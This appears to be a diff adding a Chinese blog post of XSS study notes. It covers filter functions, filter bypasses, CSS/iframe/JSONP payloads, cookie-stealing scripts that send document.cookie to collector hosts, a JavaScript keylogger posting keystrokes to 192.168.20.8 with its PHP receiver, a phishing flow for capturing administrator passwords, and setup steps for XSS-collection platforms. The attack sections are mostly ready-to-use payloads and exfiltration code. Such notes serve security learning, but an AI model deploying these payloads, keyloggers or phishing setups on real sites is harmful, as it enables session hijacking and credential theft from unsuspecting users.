+<li>htmlentities() -&gt; 转义html实体</li>
+<li>html_entity_decode() -&gt; 反转义html实体</li>
+<li>htmlspecialchars_decode() -&gt; 将特殊的 HTML 实体转换回普通字符</li>
+<li>▲ 白嫖一下bmjoker写的数据过滤类（PHP）<ul>
+<li><a href="https://www.cnblogs.com/bmjoker/p/8806899.html" target="_blank" rel="noopener">https://www.cnblogs.com/bmjoker/p/8806899.html</a></li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class XSS</span><br><span class="line">&#123;</span><br><span class="line">    /**</span><br><span class="line">    * @desc 过滤数据</span><br><span class="line">    *</span><br><span class="line">    * @param $data string|array 输入数据</span><br><span class="line">    * @param $low  bool      是否采用更为严格的过滤</span><br><span class="line">    *</span><br><span class="line">    * @return 返回过滤的数据</span><br><span class="line">    */</span><br><span class="line">    public function clean_xss($data, $low = False)</span><br><span class="line">    &#123;</span><br><span class="line">        #字符串过滤</span><br><span class="line">       if (! is_array ( $data ))</span><br><span class="line">       &#123;</span><br><span class="line">           $data = trim ( $data );              #字符两边的处理</span><br><span class="line">           $data = strip_tags ( $data );        #从字符串中去除 HTML 和 PHP 标记</span><br><span class="line">           $data = htmlspecialchars ( $data );  #特殊字符转换为HTML实体</span><br><span class="line">           if ($low)</span><br><span class="line">           &#123;</span><br><span class="line">               return $data;</span><br><span class="line">           &#125;</span><br><span class="line">           #匹配换空格</span><br><span class="line">           $data = str_replace ( array (&apos;&quot;&apos;, &quot;\\&quot;, &quot;&apos;&quot;, &quot;/&quot;, &quot;..&quot;, &quot;../&quot;, &quot;./&quot;, &quot;//&quot; ), &apos;&apos;, $data );</span><br><span class="line">           $no = &apos;/%0[0-8bcef]/&apos;;</span><br><span class="line">           $data = preg_replace ( $no, &apos;&apos;, $data );</span><br><span class="line">           $no = &apos;/%1[0-9a-f]/&apos;;</span><br><span class="line">           $data = preg_replace ( $no, &apos;&apos;, $data );</span><br><span class="line">           $no = &apos;/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]+/S&apos;;</span><br><span class="line">           $data = preg_replace ( $no, &apos;&apos;, $data );</span><br><span class="line">           return $data;</span><br><span class="line">       &#125;</span><br><span class="line">       #数组过滤</span><br><span class="line">       $arr=array();</span><br><span class="line">       foreach ($data as $k =&gt; $v)</span><br><span class="line">       &#123;</span><br><span class="line">           $temp=$this-&gt;clean_xss($v);</span><br><span class="line">           $arr[$k]=$temp;</span><br><span class="line">       &#125;</span><br><span class="line">       return $arr;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">#测试测试</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&apos;xss&apos;]=&apos;xssss&apos;;</span><br><span class="line">$xss=new XSS();</span><br><span class="line">#测试字符串</span><br><span class="line">$str = &quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;;</span><br><span class="line">echo $str;</span><br><span class="line">$str2=$xss-&gt;clean_xss($str);</span><br><span class="line">echo $str2;</span><br><span class="line">echo &quot;&lt;hr/&gt;&quot;;</span><br><span class="line">#测试数组</span><br><span class="line">$arr=array(&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;,&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;,&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;);</span><br><span class="line">echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">print_r($arr);</span><br><span class="line">echo &quot;&lt;/pre&gt;&quot;;</span><br><span class="line">$arr2=$xss-&gt;clean_xss($arr);</span><br><span class="line">echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">print_r($arr2);</span><br><span class="line">echo &quot;&lt;/pre&gt;&quot;;die;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="12-绕过magic-quotes-gpc"><a href="#12-绕过magic-quotes-gpc" class="headerlink" title="12. 绕过magic_quotes_gpc"></a>12. 绕过magic_quotes_gpc</h4><ul>
+<li>magic_quotes_gpc=ON是php中的安全设置，开启后会把一些特殊字符进行轮换，比如’(单引号)转换为&#39;，”(双引号)转换为&quot;，\转换为\</li>
+<li>例如：<code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code>会转换为<code>&lt;script&gt;alert(\&quot;xss\&quot;)&lt;/script&gt;</code></li>
+<li>针对开启了magic_quotes_gpc的网站，我们可以通过JavaScript中的String.formCharCode方法来绕过，我们可以把alert(“xss”);转换为(97,108,101,114,116,40,34,88,83,34,41,59)</li>
+<li>▲ String.formCharCode()是javascript中的字符串方法，用来把ASCII转换为字符串</li>
+</ul>
+<h4 id="13-解决限制字符（要求同页面）"><a href="#13-解决限制字符（要求同页面）" class="headerlink" title="13. 解决限制字符（要求同页面）"></a>13. 解决限制字符（要求同页面）</h4><ul>
+<li><code>&lt;script&gt;z=&#39;document.&#39;&lt;/script&gt;</code></li>
+<li><code>&lt;script&gt;z=z+&#39;write(&quot;&#39;&lt;/script&gt;</code></li>
+<li><code>&lt;script&gt;z=z+&#39;&lt;script&#39;&lt;/script&gt;</code></li>
+<li><code>&lt;script&gt;z=z+&#39; src=ht&#39;&lt;/script&gt;</code></li>
+<li><code>&lt;script&gt;z=z+&#39;tp://ww&#39;&lt;/script&gt;</code></li>
+<li><code>&lt;script&gt;z=z+&#39;w.shell&#39;&lt;/script&gt;</code></li>
+<li><code>&lt;script&gt;z=z+&#39;.net/1.&#39;&lt;/script&gt;</code></li>
+<li><code>&lt;script&gt;z=z+&#39;js&gt;&lt;/sc&#39;&lt;/script&gt;</code></li>
+<li><code>&lt;script&gt;z=z+&#39;ript&gt;&quot;)&#39;&lt;/script&gt;</code></li>
+<li><code>&lt;script&gt;eval_r(z)&lt;/script&gt;</code></li>
+</ul>
+<h4 id="14-其他XSS思路"><a href="#14-其他XSS思路" class="headerlink" title="14. 其他XSS思路"></a>14. 其他XSS思路</h4><ul>
+<li>▲ 本节部分来自bmjoker大佬的博客内容：<a href="https://www.cnblogs.com/bmjoker/p/8805395.html" target="_blank" rel="noopener">https://www.cnblogs.com/bmjoker/p/8805395.html</a> 有一部分来自ahao2333大佬的博客内容：<a href="https://www.cnblogs.com/xiaomeng2333/p/11595786.html，" target="_blank" rel="noopener">https://www.cnblogs.com/xiaomeng2333/p/11595786.html，</a> 也有部分来自心伤的瘦子@乌云</li>
+<li>第三方劫持 (外调J/C)<ul>
+<li>第三方劫持就是把资源域的服务器的权限拿下，替换相关资源，采用’迂回式’的渗透方式</li>
+<li>名字里的”外调”不是从目标网站上插入新的J/C。而是在目标网站上找到不是本站的J/C，然后渗透那个网站，重写J/C。来达到渗透目标网站</li>
+<li>外调：javascript、css、flash、etc、html、SWF</li>
+<li>来自”长短短”的代码，获取非本站的J/C</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">for(var i=0,tags=document.querySelectorAll(&apos;iframe[src],frame[src],script[src],link[rel=stylesheet],object[data],embed[src]&apos;),tag;tag=tags[i];i++)&#123;</span><br><span class="line">  var a = document.createElement(&apos;a&apos;);</span><br><span class="line">  a.href = tag.src||tag.href||tag.data;</span><br><span class="line">  if(a.hostname!=location.hostname)&#123;</span><br><span class="line">    console.warn(location.hostname+&apos; 发现第三方资源[&apos;+tag.localName+&apos;]:&apos;+a.href);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>XSS downloader<ul>
+<li>把反射和储蓄结合起来，把核心代码写在网站上，然后以XSS触发并调用代码，实现攻击</li>
+<li>▲ 《XSS跨转脚本攻击剖析与防御》一书中有</li>
+<li>▲ 2020.03.29 看的一知半解，日后再理解</li>
+</ul>
+</li>
+<li>XCS<ul>
+<li>XCS就是利用浏览器来玩XSS，它的功能比普通上的XSS还要强大，因为利用浏览器协议漏洞，可以调用浏览器的API来实现下载覆盖本地文件(可以把它这个功能理解为挂马)</li>
+<li>XSC还可以控制浏览器的历史、设置、收藏夹等</li>
+</ul>
+</li>
+<li>页面渲染XSS<ul>
+<li>jpg(ie6下才会出现)、word里写xss vector的，各种邮箱、网盘等</li>
+<li>假如我当前页面存在txt文件，而txt文件内容为<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>时，就会弹窗。因为浏览器把txt的内容当成html来输出了</li>
+<li>▲ 若站点可以上传txt，且浏览器版本低，此漏洞危害很大</li>
+</ul>
+</li>
+<li>XSF(Flash XSS)<ul>
+<li>XSF其实不算XSS的分类中，应该算作XSS的分支，因为在XSS使用到的技巧，在XSF只有一部分可以使用，因为XSF是基于ActionScript2/3.0语言的基础上</li>
+<li>在ActionScript2/3.0里以下几个函数需要重点关注下：getURL、navigateToURL、ExternalInterface.call、ExternalInterface.call、htmlText、addcallback等</li>
+<li>▲ 关乎XSF的，wooyun.tenclent中有大量的例子在云服务器上</li>
+</ul>
+</li>
+<li>XST（Cross-Site Tracing）<ul>
+<li>跨站追踪，指利用JavaScript发送HTTP的TRACE方法来窃取Cookie值或Basic认证密码的攻击手段</li>
+<li>实际上，现在的主流浏览器都已经能够自己防御XST</li>
+</ul>
+</li>
+<li>CSSXSS<ul>
+<li>css代码中利用expression触发xss漏洞<ul>
+<li><code>&lt;div style=&quot;width: expression(alert(&#39;xss&#39;));&gt;</code></li>
+<li><code>&lt;style&gt;body {background-image:expression(alert(&quot;xss&quot;));}&lt;/style&gt;</code></li>
+<li><code>&lt;div style=&quot;list-style-image:url(javascript:alert(&#39;xss&#39;))&quot;&gt;</code></li>
+</ul>
+</li>
+<li>css代码中利用@import触发xss<ul>
+<li><code>&lt;stytle&gt;@import &#39;javascript:alert(&quot;XSS&quot;)&#39;;&lt;/stytle&gt;</code></li>
+</ul>
+</li>
+<li>css代码中使用@import和link方式导入外部含有xss代码的样式表文件<ul>
+<li><code>&lt;link rel=&quot;stytlesheet&quot; href=&quot;http://www.***.com/a.css&quot;&gt;</code></li>
+<li><code>&lt;stytle type=&#39;text/css&#39;&gt;@import url(http://www.*.com/a.css);&lt;/style&gt;</code></li>
+</ul>
+</li>
+<li>▲ xss过滤函数需过滤style标签、style属性、expression、javascript、import等关键字，但实际上，CSSXSS在近几年较少</li>
+<li>▲ IE8的标准中就禁用了expression功能执行JavaScript，但在其他模式中还可以使用</li>
+</ul>
+</li>
+<li>针对HTTP头的思路（一般为PHP语言）<ul>
+<li>使用Cookie来作为显示参数的值</li>
+<li>使用Referer来作为显示参数的值</li>
+<li>使用User-Agent来作为显示参数的值</li>
+<li>记录IP地址<ul>
+<li>HTTP_X_FORWARDED-FOR() -&gt; 可伪造 -&gt; 火狐插件X-Forwarded-For Header</li>
+<li>HTTP_CLIENT_IP() -&gt; 可伪造 -&gt; 火狐插件Modify Headers</li>
+<li>REMOTE_ADDR() -&gt; 不可伪造</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>针对DOM中iframe的思路（[路径可控]问题，iframe中的输出可以控制）<ul>
+<li>▲ 针对不同浏览器，要过滤不同的协议<ul>
+<li>chrome -&gt; data协议</li>
+<li>IE -&gt; vbscript协议（vbscript里 ‘单引号表示注释，类似JS里的//）</li>
+<li>通用 -&gt; javascript协议</li>
+</ul>
+</li>
+<li>onload执行js：<code>&lt;iframe onload=&quot;alert(1)&quot;&gt;&lt;/iframe&gt;</code></li>
+<li>src 执行javascript代码：<code>&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;</code></li>
+<li>IE下vbscript执行代码：<code>&lt;iframe src=&quot;vbscript:msgbox(1)&quot;&gt;&lt;/iframe&gt;</code></li>
+<li>Chrome下data协议执行代码：<code>&lt;iframe src=&quot;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;/iframe&gt; Chrome</code></li>
+<li>上面的变体：<code>&lt;iframe src=&quot;data:text/html,&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;</code></li>
+<li>Chrome下srcdoc属性：<code>&lt;iframe srcdoc=&quot;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;</code></li>
+</ul>
+</li>
+<li>针对JSONP中地址的可控（callback参数的限制以及自定义参数）<ul>
+<li>一些程序员会动态的加载json数据，同域的时候，可以使用ajax</li>
+<li>有时候，数据所在域和当前页面所在域又不一致，跨域请求数据的手段中，有种叫做jsonp</li>
+<li>代码表示：<code>somescript.src=&quot;http://otherdomain.com/xx?jsonp=callback&quot;</code></li>
+<li>可控参数：<code>somescript.src=&quot;http://otherdomain.com/xx?jsonp=callback&amp;id=&quot;+id;</code></li>
+<li>地址的可控<ul>
+<li>script src=”完全可控” ,这种就简单了，直接将地址换为我们的JS地址</li>
+<li>script src=”/path/xxx/[路径可控]/1.js”<ul>
+<li>可以直接上传文本至同域名下，不一定要是HTML文件，需要上传点有过滤缺陷。</li>
+<li>参数可控，利用可用的json接口（script src=”/path/xxx/…/yyy/xx.json?callback=alert(1)”）</li>
+</ul>
+</li>
+<li>script src=”/xxxx/json.php?callback=xxxx&amp;param1=yyy&amp;param2=[参数可控]”情况与地址可控的第二点参数可控类似</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>针对浏览器的过滤器（chrome）<ul>
+<li>查看是否被浏览器拦截 -&gt; chrome<ul>
+<li>Refused to execute a javascript script.Source code of script found within request</li>
+<li>查看源码 -&gt; 是否被和谐</li>
+</ul>
+</li>
+<li>绕过通用方法<ul>
+<li>要求<ul>
+<li>缺陷点允许&lt;&gt; </li>
+<li>缺陷点运行=</li>
+<li>缺陷点的后方存在<code>&lt;/script&gt;</code>标签</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>构造payload：<code>&lt;script src=data:,alert(1)&lt;!--</code></li>
+<li>▲ 一般过滤器的规则，是觉得是恶意代码的才会去拦截，可以利用代码，去绕过规则</li>
+<li>▲ IE等其他浏览器的过滤器暂无找到资料</li>
+</ul>
+</li>
+<li>富文本操作<ul>
+<li>白名单，即：只允许使用白名单内的合法HTML标签，例如IMG，其它均剔除</li>
+<li>黑名单，即：厂商会构建一个有危害的HTML标签、属性列表，然后通过分析用户提交的HTML代码，剔除其中有害的部分</li>
+<li>▲ 白名单要安全得多，而黑名单的方式则经常会被绕过</li>
+<li>▲ 当所有的思路走不通时，可以用富文本，大量的payload去碰撞，用bp进行抓包修改</li>
+</ul>
+</li>
+</ul>
+<h4 id="15-同源策略与跨域访问"><a href="#15-同源策略与跨域访问" class="headerlink" title="15. 同源策略与跨域访问"></a>15. 同源策略与跨域访问</h4><ul>
+<li>▲ 本节部分来自bmjoker大佬的博客内容：<a href="https://www.cnblogs.com/bmjoker/p/9500374.html，" target="_blank" rel="noopener">https://www.cnblogs.com/bmjoker/p/9500374.html，</a> 以及阮一峰大佬的博客内容：<a href="http://www.ruanyifeng.com/blog/2016/04/cors.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2016/04/cors.html</a> ，具体内容看博客和云服务器的文章</li>
+<li>▲ 因对同源策略研究较少，此处引用大佬的文章</li>
+<li>同源策略（SOP）<ul>
+<li>同源策略基础<ul>
+<li>阻止一个页面上的恶意脚本通过页面的DOM对象获得访问另一个页面上敏感信息的权限</li>
+</ul>
+</li>
+<li>源决定规则<ul>
+<li>对于绝对的URIs，源就是{协议，主机，端口}定义的</li>
+</ul>
+</li>
+<li>安全考量（XSS+CSRF）</li>
+<li>规避同源策略<ul>
+<li>document.domain属性</li>
+<li>CORS跨域资源共享（Origin / Access-Control-Allow-Origin）<ul>
+<li>AJAX的XMLHttpRequest请求</li>
+<li>简单请求（simple request）– HEAD/GET/POST</li>
+<li>非简单请求（not-so-simple request）–PUT/OPTIONS</li>
+</ul>
+</li>
+<li>跨文档通信（postMessage()会异步的触发window上的onmessage事件）</li>
+<li>JSONP（JOSNP允许页面接受另一个域的JSON数据，通过在页面增加一个可以从其它域加载带有回调的JSON响应的<code>&lt;script&gt;</code>标签）</li>
+<li>WebSocket（浏览器允许脚本直连一个WebSocket地址而不管同源策略）</li>
+</ul>
+</li>
+<li>解决跨域访问问题<ul>
+<li>JSONP（JSON with Padding：填充式JSON)，应用JSON的一种新方法</li>
+<li>代理（通过接口的方式，后台调用php文件获取然后返回给前端）</li>
+<li>PHP端修改header（Access-Control-Allow-Origin）</li>
+<li>document.domain（解决不同window之间不能进行交互操作的问题）</li>
+<li>window.name（window.name在页面的生命周期里共享一个window.name）</li>
+<li>postMessage和onmessage（广播，监听消息）</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="16-Cookie的获取"><a href="#16-Cookie的获取" class="headerlink" title="16. Cookie的获取"></a>16. Cookie的获取</h4><ul>
+<li>反射型XSS的cookie获取</li>
+<li>存储型XSS的cookie获取</li>
+<li>http-only启用时获取登陆密码（钓鱼方式）<ul>
+<li>钓鱼准备<ul>
+<li>伪造一个完全相同的登陆界面a.html（可通过右键保存页面为html）</li>
+<li>编写一个a.php，用于接收a.html的传值并跳转到b.php</li>
+<li>编写一个b.php，用于传值后跳转到正常的登陆界面</li>
+</ul>
+</li>
+<li>攻击者往有xss漏洞的地方传入访问a.html的代码</li>
+<li>管理员登陆后台，触发攻击者插入的html代码，弹窗显示a.html界面<ul>
+<li>若想要逼真，可通过js代码展示”登陆超时，请重新登陆的”</li>
+</ul>
+</li>
+<li>管理员输入账号密码进行登陆，然后通过b.php跳转到正常登陆页面</li>
+<li>攻击者接收到管理员输入的账号密码</li>
+<li>▲ Linux平台和Windows平台克隆下来的界面源代码可能出现编码问题</li>
+<li>▲ 每次点击一次管理界面，都会触发一次xss代码</li>
+</ul>
+</li>
+<li>编写接收cookie代码：简单形式a.js+cookie.php</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//a.js</span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">    var cookie = document.cookie;</span><br><span class="line">    var url = &quot;http://127.0.0.1/cookie.php?x=&quot;;</span><br><span class="line">    windows.location.href=url_cookie;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">//cookie.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    $cookie = $_GET[&apos;x&apos;];</span><br><span class="line">    $file = fopen(&quot;cookie.txt&quot;,&quot;w+&quot;);</span><br><span class="line">    fwrite($file,$cookie);</span><br><span class="line">    fclose($file);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>编写接收cookie代码：极简模式b.js-2+cookies.php<ul>
+<li>b.js放于80端口，cookies.php是不存在的</li>
+<li>▲ 需要监听b.js中设定的端口</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var img = new Image();</span><br><span class="line">img.src=&quot;http://1.1.1.1:非80/cookies.php?cookie==&quot;+document.cookie;</span><br></pre></td></tr></table></figure>
+
+<h4 id="17-键盘记录器"><a href="#17-键盘记录器" class="headerlink" title="17. 键盘记录器"></a>17. 键盘记录器</h4><ul>
+<li>三个文件位于同个目录</li>
+<li>Keylogger.js</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">document.onkeypress = function(evt) &#123; </span><br><span class="line">    evt = evt || window.event </span><br><span class="line">    key = String.fromCharCode(evt.charCode) </span><br><span class="line">    if (key) &#123;       </span><br><span class="line">        var http = new XMLHttpRequest(); </span><br><span class="line">        var param = encodeURI(key) http.open(&quot;POST&quot;,&quot;http://192.168.20.8/keylogger.php&quot;,true); http.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">        http.send(&quot;key=&quot;+param); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Keylogger.php</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    $key=$_POST[&apos;key&apos;]; </span><br><span class="line">    $logfile=&quot;keylog.txt&quot;; </span><br><span class="line">    $fp = fopen($logfile, &quot;a&quot;); </span><br><span class="line">    fwrite($fp, $key); </span><br><span class="line">    fclose($fp);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>keylog.txt，不需要有数据，但需要有可读可写的权限</li>
+</ul>
+<h4 id="18-外用XSS平台"><a href="#18-外用XSS平台" class="headerlink" title="18. 外用XSS平台"></a>18. 外用XSS平台</h4><ul>
+<li>XSS平台注册</li>
+<li>cookie<ul>
+<li>创建模块</li>
+<li>项目名称</li>
+<li>默认模块 -&gt; keepsession</li>
+<li>生成项目代码</li>
+</ul>
+</li>
+<li>工具：COOKIE强力注入工具（小马）-&gt; 漏洞页面+COOKIE输入 -&gt; 强制修改 -&gt; 浏览尝试</li>
+<li>工具：Firefox浏览器Cookies Manager -&gt; 搜索 -&gt; Add Cookie（添加一个或多个）</li>
+<li>XSS平台<ul>
+<li>webhack platfrom：<a href="http://www.webhack.cn/" target="_blank" rel="noopener">http://www.webhack.cn/</a></li>
+<li>xsshs：<a href="https://xsshs.cn/" target="_blank" rel="noopener">https://xsshs.cn/</a></li>
+</ul>
+</li>
+</ul>
+<h4 id="19-个人XSS平台（BlueLotus）"><a href="#19-个人XSS平台（BlueLotus）" class="headerlink" title="19. 个人XSS平台（BlueLotus）"></a>19. 个人XSS平台（BlueLotus）</h4><ul>
+<li>原项目地址：<a href="https://github.com/firesunCN/_XSSReceiver" target="_blank" rel="noopener">https://github.com/firesunCN/_XSSReceiver</a></li>
+<li>项目地址：<a href="https://github.com/asw3asw/BlueLotus_XSSReceiver" target="_blank" rel="noopener">https://github.com/asw3asw/BlueLotus_XSSReceiver</a></li>
+<li>安装博客链接：<a href="https://www.cnblogs.com/blacksunny/p/8401688.html" target="_blank" rel="noopener">https://www.cnblogs.com/blacksunny/p/8401688.html</a></li>
+<li>实验环境<ul>
+<li>服务器：CentOS</li>
+<li>Web容器：Apache</li>
+<li>脚本语言：PHP</li>
+</ul>
+</li>
+<li>安装Apache<ul>
+<li>yum install httpd –y</li>
+<li>service httpd start</li>
+<li>浏览器访问<a href="http://IP地址尝试，能否访问到页面" target="_blank" rel="noopener">http://IP地址尝试，能否访问到页面</a></li>
+</ul>
+</li>
+<li>安装PHP<ul>
+<li>yum install php –y</li>
+</ul>
+</li>
+<li>安装Git<ul>
+<li>yum install git –y</li>
+</ul>
+</li>
+<li>源码存放<ul>
+<li>从Github上下载源码</li>
+<li>mkdir /var/www/html/xss</li>
+<li>存放源码到/xss目录中</li>
+<li>chomd -R 777 /var/www/html/xss（此平台一些文件夹需可读可写可执行权限）</li>
+</ul>
+</li>
+<li>配置虚拟主机<ul>
+<li>新建虚拟主机配置文件夹：mkdir/etc/httpd/conf/vhost</li>
+<li>新建虚拟主机配置文件：vi /etc/httpd/conf/vhost/httpd-vhosts.conf</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;VirtualHost *:8088&gt;</span><br><span class="line">    DocumentRoot &quot;/var/www/html/xss&quot;</span><br><span class="line">    DirectoryIndex admin.php</span><br><span class="line">    ServerName xss.xxx.top</span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line">&lt;VirtualHost *:8088&gt;</span><br><span class="line">    DocumentRoot &quot;/var/www/html/web&quot;</span><br><span class="line">    DirectoryIndex index.php</span><br><span class="line">    ServerName web.xxx.top</span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line">&lt;VirtualHost *:8088&gt;</span><br><span class="line">    DocumentRoot &quot;/var/www/html/kodex&quot;</span><br><span class="line">    DirectoryIndex index.php</span><br><span class="line">    ServerName kodex.xxx.top</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>配置Apache<ul>
+<li>备份配置文件：cp/etc/httpd/conf/httpd.conf /etc/httpd/conf/httpd.conf.bak</li>
+<li>编辑配置文件：vi/etc/httpd/conf/httpd.conf<ul>
+<li>DocumentRoot “/var/www/html”</li>
+<li>Options ExecCGIFollowSymLinks（允许服务器使用CGI，在Directory的/var/www/html目录下）</li>
+<li>AllowOverrideAll（在Directory的/var/www/html目录下）</li>
+<li>插入：Include/etc/httpd/conf/vhost/httpd-vhosts.conf</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>重启Apache：service httpd restart</li>
+<li>安装平台<ul>
+<li>访问http://服务器IP地址</li>
+<li>设置后台登录密码、数据加密密码<ul>
+<li>其余选项可保持默认，然后提交</li>
+<li>▲ 一定记得要修改</li>
+<li>▲ 若提示data/template/myjs三个存储路径需要写权限，可在/xss目录下进行修改</li>
+</ul>
+</li>
+<li>安装成功</li>
+</ul>
+</li>
+<li>登陆访问尝试以及平台测试（获取Cookie）<ul>
+<li>访问http://服务器IP地址/login.php</li>
+<li>配置公共模板default.js，修改js代码中的网站地址为http://服务器IP地址/index.php</li>
+<li>最后，点击下方的修改，保存修改</li>
+<li>进入”我的js”模块</li>
+<li>设置js文件名称</li>
+<li>选择default.js模板</li>
+<li>插入模板</li>
+<li>新增保存js测试代码</li>
+<li>生成payload</li>
+<li>站点尝试是否能打到cookie（即使http-only也会返回一定数据）</li>
+</ul>
+</li>
+</ul>
+<h4 id="20-多人用XSS平台"><a href="#20-多人用XSS平台" class="headerlink" title="20. 多人用XSS平台"></a>20. 多人用XSS平台</h4><ul>
+<li>▲ 修改已有XSS平台的代码，然后搭建在自己的服务器上</li>
+<li>Window Server 2003 -&gt;  iis搭建xss平台套装（ZkeysPHP、xs.zip、ISAPI_Rewrite3）<ul>
+<li>Window Server 2003绑定静态IP<ul>
+<li>需要一个固定IP，若要提供外网使用，需要一个外网IP</li>
+</ul>
+</li>
+<li>安装iis -&gt; 开始 -&gt; 管理工具 -&gt; IIS -&gt; 网站 -&gt; 默认网站</li>
+<li>默认网站 -&gt; 网站根目录 -&gt; 清除源码 -&gt; 拷贝xs.zip中的源码到文件夹</li>
+<li>安装ZkeysPHP（php+mysql环境）</li>
+<li>浏览器访问<a href="http://127.0.0.1:999（phpmyadmin）" target="_blank" rel="noopener">http://127.0.0.1:999（phpmyadmin）</a><ul>
+<li>用户名：root / 密码：zkeys</li>
+<li>创建数据库xss</li>
+<li>导入 -&gt; 浏览 -&gt; 网站根目录 -&gt; xssplatform.sql -&gt; 执行</li>
+<li>SQL -&gt; UPDATE oc_moudle SET code=REPLACE(code,’<a href="http://xsser.me&#39;,&#39;http://Window" target="_blank" rel="noopener">http://xsser.me&#39;,&#39;http://Window</a> Server 2003的IP’)</li>
+</ul>
+</li>
